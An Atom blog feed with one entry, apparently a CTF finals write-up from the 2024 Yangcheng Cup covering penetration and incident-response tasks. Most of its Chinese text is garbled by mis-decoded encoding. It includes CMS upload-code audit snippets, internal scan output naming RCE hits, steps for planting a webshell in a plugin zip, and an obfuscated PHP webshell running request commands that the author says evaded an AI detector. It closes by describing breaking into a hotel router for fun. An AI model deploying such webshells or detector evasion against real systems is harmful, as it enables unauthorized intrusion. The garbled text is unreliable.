<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>é›²æµã®Lowest World</title>
  
  
  <link href="http://c1oudfl0w0.github.io/blog/atom.xml" rel="self"/>
  
  <link href="http://c1oudfl0w0.github.io/blog/"/>
  <updated>2024-09-13T16:51:53.976Z</updated>
  <id>http://c1oudfl0w0.github.io/blog/</id>
  
  <author>
    <name>C1oudfL0w0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2024ç¾ŠåŸæ¯å†³èµ›</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/</id>
    <published>2024-09-10T15:22:56.000Z</published>
    <updated>2024-09-13T16:51:53.976Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é¦–æ¬¡é‡ä¸Šå®‰æ’æ¸—é€ï¼Œdockerç¯å¢ƒå‘½ä»¤é™åˆ¶ï¼Œæ²¡å‘vpså›°éš¾é‡é‡ï¼Œæ‹¼å°½å…¨åŠ›ä¹Ÿæ— æ³•æˆ˜èƒœ</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240911164742109.png" alt="image-20240911164742109"></p><span id="more"></span><hr><h1 id="æ¸—é€éƒ¨åˆ†"><a href="#æ¸—é€éƒ¨åˆ†" class="headerlink" title="æ¸—é€éƒ¨åˆ†"></a>æ¸—é€éƒ¨åˆ†</h1><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>dirsearchæ‰«ç›®å½•ï¼Œæœ‰robots.txt</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240911102531988.png" alt="image-20240911102531988"></p><p>è®¿é—® &#x2F;flag2.txt å³å¯å¾—åˆ°</p><p>è¿˜æœ‰archive.zipï¼Œæ˜¯å®˜ç½‘çš„æºç ï¼ŒCatfish cmsï¼Œtp5.0.0æ¡†æ¶</p><h3 id="Catfish-CMSå®¡è®¡ï¼ˆFailedï¼‰"><a href="#Catfish-CMSå®¡è®¡ï¼ˆFailedï¼‰" class="headerlink" title="Catfish CMSå®¡è®¡ï¼ˆFailedï¼‰"></a>Catfish CMSå®¡è®¡ï¼ˆFailedï¼‰</h3><p>æœäº†ä¸‹æœ¬åœ°æ–‡åº“éƒ½æ˜¯xssçš„æ´ï¼Œå®Œå…¨ç”¨ä¸ä¸Š</p><p>æˆ‘ä»¬å¯ä»¥è‡ªè¡Œæ³¨å†Œç™»å½•è´¦å·ï¼Œåœ¨ç”¨æˆ·åå°å‘ç°å¤´åƒå¤„å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œå¯¹åº”çš„ä»£ç ï¼š</p><p>application\user&#x2F;controller&#x2F;Index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">uploadhead</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$validate</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string single-quoted-string">'ext'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'jpg,png,gif,jpeg'</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token variable">$validate</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">move</span><span class="token punctuation">(</span><span class="token constant">ROOT_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'data'</span> <span class="token operator">.</span> <span class="token constant">DS</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'uploads'</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">picpre</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$image</span> <span class="token operator">=</span> <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>Image</span><span class="token operator">::</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token constant">ROOT_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'data'</span> <span class="token operator">.</span> <span class="token constant">DS</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'uploads'</span> <span class="token operator">.</span> <span class="token constant">DS</span> <span class="token operator">.</span> <span class="token variable">$info</span><span class="token operator">-></span><span class="token function">getSaveName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$width</span> <span class="token operator">=</span> <span class="token variable">$image</span><span class="token operator">-></span><span class="token function">width</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$height</span> <span class="token operator">=</span> <span class="token variable">$image</span><span class="token operator">-></span><span class="token function">height</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$width</span> <span class="token operator">></span> <span class="token number">300</span> <span class="token operator">||</span> <span class="token variable">$height</span> <span class="token operator">></span> <span class="token number">300</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            @<span class="token variable">$image</span><span class="token operator">-></span><span class="token function">thumb</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>Image</span><span class="token operator">::</span><span class="token constant">THUMB_CENTER</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token constant">ROOT_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'data'</span> <span class="token operator">.</span> <span class="token constant">DS</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'uploads'</span> <span class="token operator">.</span> <span class="token constant">DS</span> <span class="token operator">.</span> <span class="token variable">$info</span><span class="token operator">-></span><span class="token function">getSaveName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$info</span><span class="token operator">-></span><span class="token function">getSaveName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// catfish/library/think/File.php</span><span class="token comment">/**     * è®¾ç½®ä¸Šä¼ æ–‡ä»¶çš„éªŒè¯è§„åˆ™     * @param  array   $rule    éªŒè¯è§„åˆ™     * @return $this*/</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">validate</span><span class="token punctuation">(</span><span class="token variable">$rule</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">validate</span> <span class="token operator">=</span> <span class="token variable">$rule</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥è¿”å›ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ï¼Œä½†æ˜¯åç¼€é™åˆ¶æ˜¯ç™½åå•æ²¡æ³•åˆ©ç”¨</p><p>å°è¯•æ‰¾æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯åªæœ‰æ¨¡æ¿æ¸²æŸ“çš„ä»£ç </p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240913235138153.png" alt="image-20240913235138153"></p><p>ä¸€è·¯è·Ÿè¿‡å»æ²¡æ‰¾åˆ°å¯åˆ©ç”¨çš„åœ°æ–¹</p><p>æ³¨æ„åˆ°ç™»å½•æ¥å£è°ƒç”¨äº† tp çš„ captchaï¼ŒæŠ“åŒ…å‘ç°åˆ æ‰ captcha å‚æ•°å°±å¯ä»¥ç»•è¿‡éªŒè¯ç ç™»å½•ï¼Œå°è¯•çˆ†ç ´adminçš„å¯†ç ï¼Œå¤±è´¥</p><p>å†çœ‹ä¸€ä¸‹sqlçš„éƒ¨åˆ†ï¼Œ3306ç«¯å£æ²¡å¼€ï¼Œä¸èƒ½ç›´æ¥è¿æ•°æ®åº“ï¼Œç¿»äº†åŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°èƒ½æ³¨å…¥çš„ç‚¹</p><p>&#x2F;public&#x2F;commom&#x2F;umeditor æœ‰ä¸ªç¼–è¾‘å™¨ï¼Œå¯¹åº”çš„ä»£ç åœ¨ public&#x2F;common&#x2F;umeditor&#x2F;php&#x2F; ä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span> <span class="token class-name">E_ERROR</span> <span class="token operator">|</span> <span class="token class-name">E_WARNING</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Asia/chongqing"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"Uploader.class.php"</span><span class="token punctuation">;</span>    <span class="token comment">//ä¸Šä¼ é…ç½®</span>    <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string double-quoted-string">"savePath"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"../../../../data/uploads/"</span> <span class="token punctuation">,</span>             <span class="token comment">//å­˜å‚¨æ–‡ä»¶å¤¹</span>        <span class="token string double-quoted-string">"maxSize"</span> <span class="token operator">=></span> <span class="token number">5000</span> <span class="token punctuation">,</span>                   <span class="token comment">//å…è®¸çš„æ–‡ä»¶æœ€å¤§å°ºå¯¸ï¼Œå•ä½KB</span>        <span class="token string double-quoted-string">"allowFiles"</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">".gif"</span> <span class="token punctuation">,</span> <span class="token string double-quoted-string">".png"</span> <span class="token punctuation">,</span> <span class="token string double-quoted-string">".jpg"</span> <span class="token punctuation">,</span> <span class="token string double-quoted-string">".jpeg"</span> <span class="token punctuation">,</span> <span class="token string double-quoted-string">".bmp"</span> <span class="token punctuation">,</span> <span class="token string double-quoted-string">".webp"</span> <span class="token punctuation">)</span>  <span class="token comment">//å…è®¸çš„æ–‡ä»¶æ ¼å¼</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//ä¸Šä¼ æ–‡ä»¶ç›®å½•</span>    <span class="token variable">$Path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"../../../../data/uploads/"</span><span class="token punctuation">;</span>    <span class="token comment">//èƒŒæ™¯ä¿å­˜åœ¨ä¸´æ—¶ç›®å½•ä¸­</span>    <span class="token variable">$config</span><span class="token punctuation">[</span> <span class="token string double-quoted-string">"savePath"</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$Path</span><span class="token punctuation">;</span>    <span class="token variable">$up</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"upfile"</span> <span class="token punctuation">,</span> <span class="token variable">$config</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$callback</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'('</span><span class="token punctuation">,</span><span class="token string single-quoted-string">')'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'callback'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$up</span><span class="token operator">-></span><span class="token function">getFileInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * è¿”å›æ•°æ®     */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script>'</span><span class="token operator">.</span><span class="token variable">$callback</span><span class="token operator">.</span><span class="token string single-quoted-string">'('</span><span class="token operator">.</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">')&lt;/script>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿæ˜¯ç™½åå•æ–‡ä»¶ä¸Šä¼ ï¼ŒåŒæ—¶ä¼šè½¬ä¹‰htmlï¼Œxssä¹Ÿæ²¡å¸Œæœ›</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240914000011840.png" alt="image-20240914000011840"></p><p>æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰ååºåˆ—åŒ–å…¥å£ï¼Œç¿»äº†ä¸€åœˆå‘ç°ååºåˆ—åŒ–æ•°æ®åŸºæœ¬ä¸Šéƒ½æ˜¯ä»æ•°æ®åº“æˆ–è€…ç¼“å­˜é‡Œé¢è·å–çš„</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240914000148128.png" alt="image-20240914000148128"></p><p>é‚£æ€ä¹ˆåŠï¼Œæƒ³åˆ°å‰é¢æœ‰ captcha æ¥å£ï¼Œæ‰¾ä¸€ä¸‹rceçš„é“¾å­</p><p>ç»“æœæµ‹è¯•äº†åŠå¤©å‘ç°captchaä¸èƒ½ç”¨postè®¿é—®ï¼Œä¸€è®¿é—®å°±é‡å®šå‘åˆ°404</p><p>è°ƒè¯•äº†åŠå¤©ï¼Œå‘ç°æ ¹æœ¬è¿›ä¸å»<code>filterValue</code>ï¼Œç„¶å get è¯·æ±‚è¿˜è‡ªå¸¦ä¸€ä¸ª id å‚æ•°</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240914000911275.png" alt="image-20240914000911275"></p><p>ä¸€æ—©ä¸Šéƒ½åœ¨æŒ–é“¾å­è¿˜æ²¡ç»“æœï¼ŒçœŸå®Œè›‹woc</p><hr><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>åƒå®Œåˆé¥­å‰©ä¸¤ä¸ªå°æ—¶å·¦å³ï¼Œæ­¤æ—¶ä¾æ—§æ˜¯åªäº¤äº†ä¸€ä¸ªflagï¼Œé˜Ÿå‹nmapæ‰«é«˜ç«¯å£æ‰å‘ç°35007ä¸Šä¹Ÿå¼€äº†ä¸ªtpã€‚ã€‚ã€‚nm</p><p>æ˜¯ä¸ªaiç«™ï¼Œè¿™ä¸ªå¯ä»¥ç›´æ¥ç”¨å·¥å…·ä¸€æŠŠæ¢­</p><p>æ ¹ç›®å½•ä¸‹æœ‰flag01</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240911140056571.png" alt="image-20240911140056571"></p><p>ç„¶åé€†å¤©çš„æ¥äº†ï¼Œdockerèµ·çš„æ¸—é€ç¯å¢ƒé‡Œé¢æ²¡æœ‰<code>ipconfig</code>ç­‰ç›¸å…³çš„å‘½ä»¤</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240914001657513.png" alt="image-20240914001657513"></p><p>åé¢å…¨é é˜Ÿå‹ç¿» socket æ‰æ‰¾åˆ°å†…ç½‘ç½‘æ®µ</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">192.168.54.70:80 open192.168.54.1:22 open192.168.54.1:80 open192.168.54.130:80 open192.168.54.107:3306 open[*] WebTitle http://192.168.54.130     code:200 len:46512  title:AI.Tech - YangCheng Artificial Intelligence[*] WebTitle http://192.168.54.1       code:200 len:30753  title:ç¾ŠåŸæ•°æ™ºç§‘æŠ€æœ‰é™å…¬å¸ | Yangcheng Technology[*] WebTitle http://192.168.54.70      code:200 len:30762  title:ç¾ŠåŸæ•°æ™ºç§‘æŠ€æœ‰é™å…¬å¸ | Yangcheng Technology[+] PocScan http://192.168.54.130 poc-yaml-thinkphp5023-method-rce poc1192.168.30.1:22 open192.168.54.1:22 open192.168.95.1:22 open192.168.119.1:22 open192.168.130.1:22 open[*] WebTitle http://192.168.30.130     code:200 len:282    title:None[*] WebTitle http://192.168.30.100:8848 code:404 len:431    title:HTTP Status 404 â€“ Not Found[*] WebTitle http://192.168.30.33:8080 code:404 len:713    title:HTTP Status 404 â€“ Not Found[*] WebTitle http://192.168.30.121     code:200 len:7080   title:ç³»ç»Ÿå‘ç”Ÿé”™è¯¯[*] WebTitle http://192.168.30.1       code:200 len:7080   title:ç³»ç»Ÿå‘ç”Ÿé”™è¯¯[+] PocScan http://192.168.30.100:8848 poc-yaml-alibaba-nacos<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ‰ä¸ªæ•°æ®åº“ï¼Œä½†æ˜¯è´¦å¯†ä¸æ˜¯å®˜ç½‘æºç çš„é‚£ä¸ªï¼Œç»§ç»­æ‰«ä¸‹é¢5ä¸ªçš„cæ®µå‘ç°å¯¹åº”çš„webæœåŠ¡</p><p>å¦ä¸€ä¸ªé—®é¢˜æ˜¯åå¼¹shellï¼Œæ²¡å‘vpsï¼Œç„¶åæµ‹äº†ä¸‹ä¹Ÿä¸é€šæˆ‘ä»¬ä¸»æœºçš„ipï¼Œä¹Ÿæ˜¯é é˜Ÿå‹æ­æ­£å‘shellä»£ç†å‡ºæ¥</p><hr><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>é˜Ÿå‹æ‰¾åˆ°ä¸ª Confluence æœåŠ¡ï¼Œé‡Œé¢æ‰¾åˆ°å®˜ç½‘è´¦å¯†å’ŒOAç³»ç»Ÿçš„è´¦å¯†ï¼ŒOAè²Œä¼¼åœ¨äºŒå±‚å†…ç½‘</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240911161246923.png" alt="image-20240911161246923"></p><p>é‚£ä¹ˆå°±èƒ½è¿›ç®¡ç†å‘˜åå°äº†ï¼Œç„¶åä¸èƒ½ç‚¹è®¾ç½®ä¸»é¢˜ï¼Œä¸ç„¶ä¼šè¢«é‡å®šå‘å›ç™»å½•é¡µç¡¬æ§å‡ åˆ†é’Ÿã€‚ã€‚ã€‚</p><p>æ³¨æ„åˆ°ä¸Šä¼ æ’ä»¶å¤„å¯ä»¥ä¼ zipï¼Œä½†æ˜¯zipé‡Œçš„å†…å®¹å¾—æ˜¯è§„å®šæ ¼å¼æ‰èƒ½æ˜¾ç¤ºåœ¨æ’ä»¶åˆ—è¡¨é‡Œè¾¹</p><p>ç›´æ¥å…³é—­åŸå…ˆçš„ announcement æ’ä»¶ï¼Œç„¶åæ‰“åŒ…æºç é‡Œçš„ announcement æ’ä»¶ï¼Œæ’å…¥webshell</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240911161345491.png" alt="image-20240911161345491"></p><p>ä¸Šä¼ åå†æ¬¡å¯ç”¨</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240911161312342.png" alt="image-20240911161312342"></p><p>æ­¤æ—¶è®¿é—®ä¸»é¡µå°±èƒ½getshelläº†</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240911161430673.png" alt="image-20240911161430673"></p><hr><h2 id="flag14"><a href="#flag14" class="headerlink" title="flag14"></a>flag14</h2><p>æ˜¯ä¸€ä¸ªai webshellæ£€æµ‹çš„åŠŸèƒ½ï¼Œä¼ ä¸ªå…æ€å›¾ç‰‡é©¬ç§’äº†ï¼Œé™„ä»¶éƒ½æ²¡æ¥å¾—åŠçœ‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"s#y#s#t#e#m"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240911144622193.png" alt="image-20240911144622193"></p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240911150845814.png" alt="image-20240911150845814"></p><hr><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><p>Confluence æ‰«å‡ºä¸ª cve2021 çš„æ´ï¼Œé˜Ÿå‹æ‰“æ‰äº†</p><p>å‰©ä¸‹çš„åªèƒ½è¯´æ¥ä¸åŠäº†ï¼ŒNacosæ²¡æ—¶é—´æ‰“</p><hr><h1 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h1><h2 id="flag02-1"><a href="#flag02-1" class="headerlink" title="flag02"></a>flag02</h2><blockquote><p>å¯¹è¯¥ä¼ä¸šä¸­çš„Webåº”ç”¨æœåŠ¡å™¨è¿›è¡Œå…¥ä¾µæ’æŸ¥ï¼Œæ‰¾åˆ°æ”»å‡»è€…ç•™ä¸‹çš„Webshellï¼Œæäº¤Webshellæ–‡ä»¶åç§°ã€‚</p></blockquote><p>ai techç«™ä¸Šé©¬ä¹‹åå‘ç° public ä¸‹è¿˜æœ‰å¦ä¸€ä¸ªé©¬</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240911135929444.png" alt="image-20240911135929444"></p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240914001456608.png" alt="image-20240914001456608"></p><hr><h2 id="flag01-1"><a href="#flag01-1" class="headerlink" title="flag01"></a>flag01</h2><p>æ‹¿åˆ°å®˜ç½‘çš„shellå°±èƒ½ç¿»åˆ°äº†</p><hr><h2 id="flag03-1"><a href="#flag03-1" class="headerlink" title="flag03"></a>flag03</h2><p>é˜Ÿå‹åšçš„ï¼Œæˆ‘ä¸åˆ°å•Š</p><hr><h1 id="åæ—¥è°ˆ"><a href="#åæ—¥è°ˆ" class="headerlink" title="åæ—¥è°ˆ"></a>åæ—¥è°ˆ</h1><p><del>æ²¡èƒ½è®©å®‰æ’æ¸—é€æ»¡æ„çœŸæ˜¯æŠ±æ­‰</del></p><p>è¿™æ¬¡è¾“ç»™æ—¶é—´äº†ï¼Œæ—©ä¸Šæµªè´¹äº†å¤ªå¤šæ—¶é—´åœ¨å®˜ç½‘äº†å¯¼è‡´åé¢å†…ç½‘æ‰“èµ·æ¥æ‰‹å¿™è„šä¹±ï¼Œè€Œä¸”æœ¬ç§‘ç»„çš„å¼ºåº¦ç¡®å®ææ€–ï¼ŒåŒ—é‚®âœŒakäº†æ˜¯çœŸçš„çŒ›ï¼Œ<del>å’±è¿™åˆ†è¦æ˜¯å»éš”å£ç»„ä¹Ÿèƒ½æ··ä¸ªäºŒç­‰å¥–äº†</del></p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240914004437214.png" alt="image-20240914004437214"></p><p>ä¸»æŒäººæ»šæ¦œï¼Œå—¯æˆ‘åœ¨æœŸå¾…ä»€ä¹ˆï¼ˆæŸšå­å¨å¥½æœ‰å®åŠ›</p><br><p>ä¸è¿‡æœ¬æ¥ä¹Ÿæ˜¯æŠ±ç€å‡ºå·®ç©çš„å¿ƒæƒ…æ¥æ‰“çš„ï¼Œè¯¶è¿™é…’åº—çš„æ—©æ™šé¤è¿˜æŒºä¸°ç››ğŸ˜‹</p><p>è¯è¯´å¦‚æœå·…å³°æå®¢ï¼Œç¾ŠåŸæ¯ï¼Œäº¬æ´¥å†€é•¿åŸæ¯å…¨è¿›çº¿ä¸‹èµ›çš„è¯ï¼Œæ˜¯ä¸æ˜¯è¿™å‡ å¤©åŸºæœ¬ä¸Šæ˜¯å…¨å›½å¯é£ğŸ¤”</p><p>æ²¡æ´»äº†ï¼Œè¿›ä¸ªé…’åº—è·¯ç”±å™¨ç©ç©ï¼ˆ</p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240910232605385.png" alt="image-20240910232605385"></p><p><img src="/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240910232355400.png" 